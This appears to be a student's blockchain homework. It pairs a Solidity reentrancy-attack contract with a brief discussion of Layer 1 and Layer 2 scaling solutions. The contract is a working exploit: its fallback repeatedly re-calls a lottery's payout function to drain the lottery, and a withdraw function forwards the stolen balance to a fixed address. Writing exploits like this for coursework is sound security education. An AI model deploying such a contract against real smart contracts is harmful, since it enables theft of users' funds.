# Homework 15
## Write a contract to form a re entrancy attack against the lottery contract.
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "./Lottery.sol";
import "./Oracle.sol";

contract ReentrancyAttack {

    Lottery lotteryContract;
    Oracle oracleContract;
    
    constructor() public {
        lotteryContract = Lottery(0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8);
        oracleContract = Oracle(0xd9145CCE52D386f254917e481eB44e9943F39138);
    }

    fallback() external payable {
        lotteryContract.payoutWinningTeam(address(this));
    }

    function drain() public payable {
        lotteryContract.makeAGuess(address(this), oracleContract.getRandomNumber() );
        lotteryContract.payoutWinningTeam(address(this));
    }
 
    function withdraw() public {
        (bool sent,) = address(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db).call.value(address(this).balance)("");
        require(sent);
    }

    function deposit() public payable {}
}
```
## Discuss in your teams the merits of the different types of scalability solutions
We have scalability solutions on Layer 1, such as sacrificing decentralization in order to improve scalability. Example, reducing the number of validating nodes (or miners) with more capable processing computers. </br>
Other solutions are Layer 2, which solve the problem of not to many TPS (transactions per second) in L1 (working in the execution layer). Their solution is batching transactions on their own blockchain, so later they can send them to L1. This way, they are taking advantage of the security components of L1 but at a much better experience for the user.
### Which solutions have you used ?
I have mainly used L2 solutions such as Polygon, Optimism and Arbitrum.
### What are your criteria for choosing a solution ?
My criteria first is security. Since the ones i mentioned take advantage of the security state of Ethereum, i feel much more confident. The second is liquidity, meaning which L2 has more users and the third is performance, which of them have a better user experience.